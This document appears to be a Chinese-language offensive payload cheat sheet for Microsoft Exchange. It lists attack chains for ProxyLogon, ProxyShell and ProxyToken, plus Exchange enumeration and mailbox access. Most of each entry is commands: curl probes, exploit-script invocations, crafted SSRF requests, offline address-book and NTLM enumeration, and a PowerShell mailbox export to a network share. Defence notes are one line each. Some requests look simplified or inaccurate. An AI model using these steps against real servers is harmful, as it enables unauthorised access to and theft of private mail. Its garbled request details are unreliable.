# Exchange攻击

_5 条 intranet payload_

### ProxyLogon攻击  `proxylogon`
_CVE-2021-26855 Exchange SSRF_
子类：**ProxyLogon** · tags: `exchange` `proxylogon` `cve-2021-26855`

**前置条件：**
- Exchange可访问

**攻击链：**

**探测漏洞**
> 检查Exchange版本
_platform: linux_
```
curl -k https://exchange.com/owa/auth/x.js
检查Exchange版本
```

**利用脚本**
> 利用ProxyLogon
_platform: linux_
```
python proxylogon.py -u https://exchange.com -e admin@domain.com
获取管理员邮箱访问权限
```
**语法解析：**
- `-u` — Exchange URL _parameter_
- `-e` — 目标邮箱 _parameter_

**手动利用**
> 手动构造请求
```
POST /owa/auth/x.js HTTP/1.1
Cookie: X-AnonResource=true; X-AnonResource-Backend=localhost/ecp/default.flt?~3;
X-ClientId=xxx

构造SSRF请求
```


**概述：** ProxyLogon是Exchange的SSRF漏洞。

**漏洞原理：** Exchange前端存在SSRF漏洞。

**利用方法：** 利用流程：1) 探测Exchange 2) 构造SSRF请求 3) 获取访问权限

**防御措施：** 防御措施：1) 安装补丁 2) 网络隔离 3) 监控异常请求

---

### ProxyShell攻击  `proxyshell`
_CVE-2021-34473 Exchange RCE_
子类：**ProxyShell** · tags: `exchange` `proxyshell` `cve-2021-34473`

**前置条件：**
- Exchange可访问

**攻击链：**

**探测漏洞**
> 探测漏洞
_platform: linux_
```
curl -k "https://exchange.com/autodiscover/autodiscover.json?@foo.com/mapi/nspi?&Email=autodiscover/autodiscover.json%3f@foo.com"
检查是否存在漏洞
```

**利用脚本**
> 利用ProxyShell
_platform: linux_
```
python proxyshell.py -u https://exchange.com -e admin@domain.com
获取邮箱访问并执行命令
```

**获取邮件**
> 访问邮箱
```
GET /autodiscover/autodiscover.json?@domain.com/owa/?&Email=admin@domain.com HTTP/1.1
访问邮箱内容
```


**概述：** ProxyShell是Exchange的RCE漏洞链。

**漏洞原理：** Exchange存在SSRF和RCE漏洞。

**利用方法：** 利用流程：1) 探测漏洞 2) 获取访问令牌 3) 执行命令

**防御措施：** 防御措施：1) 安装补丁 2) 网络隔离 3) 监控异常请求

---

### Exchange枚举  `exchange-enum`
_枚举Exchange服务和配置_
子类：**枚举** · tags: `exchange` `enum` `recon`

**前置条件：**
- Exchange可访问

**攻击链：**

**版本探测**
> 探测Exchange版本
_platform: linux_
```
curl -k https://exchange.com/owa/auth/logon.aspx
检查页面源码获取版本信息
```

**Autodiscover**
> Autodiscover枚举
_platform: linux_
```
curl -k -u user:pass https://exchange.com/autodiscover/autodiscover.xml
获取Exchange配置信息
```

**邮箱枚举**
> 枚举邮箱用户
_platform: linux_
```
python oab.py https://exchange.com
下载离线通讯录枚举用户
```

**NTLM泄露**
> NTLM信息泄露
_platform: linux_
```
curl -k https://exchange.com/autodiscover/autodiscover.xml
从WWW-Authenticate头获取域信息
```


**概述：** Exchange枚举可获取大量信息。

**漏洞原理：** Exchange暴露过多信息。

**利用方法：** 利用流程：1) 探测版本 2) 枚举用户 3) 获取配置

**防御措施：** 防御措施：1) 隐藏版本信息 2) 限制访问 3) 监控异常请求

---

### ProxyToken攻击  `exchange-proxytoken`
_利用Exchange ProxyToken绕过认证_
子类：**ProxyToken** · tags: `exchange` `proxytoken` `bypass`

**前置条件：**
- Exchange服务器
- 存在漏洞

**攻击链：**

**检测漏洞**
> 检测漏洞
_platform: linux_
```
使用ProxyToken工具:
python proxytoken.py -u https://exchange.com -e user@domain.com
检测是否存在漏洞
```

**利用漏洞**
> 获取邮箱访问
_platform: linux_
```
python proxytoken.py -u https://exchange.com -e user@domain.com -a
获取用户邮箱访问权限
```
**语法解析：**
- `ProxyToken` — 利用前端代理认证绕过 _keyword_
- `EWS接口` — 通过EWS访问邮箱 _keyword_

**访问邮箱**
> 访问EWS接口
```
curl -k https://exchange.com/ews/Exchange.asmx -H "X-ClientApplication: Test"
绕过认证访问EWS
```


**概述：** ProxyToken利用Exchange前端代理认证缺陷。

**漏洞原理：** Exchange前端代理未正确验证认证。

**利用方法：** 利用流程：1) 检测漏洞 2) 构造请求 3) 绕过认证访问邮箱

**防御措施：** 防御措施：1) 安装补丁 2) 加强认证验证 3) 监控异常请求

---

### Exchange邮箱访问  `exchange-mailbox-access`
_通过各种方式访问Exchange邮箱_
子类：**邮箱访问** · tags: `exchange` `mailbox` `access`

**前置条件：**
- Exchange凭证或漏洞

**攻击链：**

**OWA访问**
> OWA Web访问
```
https://exchange.com/owa
使用凭证登录OWA
查看邮件、日历等
```

**EWS访问**
> EWS API访问
_platform: linux_
```
使用Impacket:
python exchanger.py domain/user:password@exchange.com
或使用EWSTools
```

**Outlook MAPI**
> Outlook客户端
_platform: windows_
```
配置Outlook连接Exchange
使用MAPI协议访问邮箱
支持邮件、日历、联系人
```
**语法解析：**
- `OWA` — Outlook Web App _keyword_
- `EWS` — Exchange Web Services _keyword_
- `MAPI` — Messaging API _keyword_

**导出邮箱**
> 导出邮箱
_platform: windows_
```
PowerShell:
New-MailboxExportRequest -Mailbox user@domain.com -FilePath "\\server\share\user.pst"
导出邮箱为PST文件
```


**概述：** Exchange邮箱可通过多种协议访问。

**漏洞原理：** 获取凭证后可完全控制邮箱。

**利用方法：** 利用流程：1) 获取凭证 2) 选择访问方式 3) 访问邮箱数据

**防御措施：** 防御措施：1) MFA认证 2) 监控异常登录 3) 审计邮箱访问

---
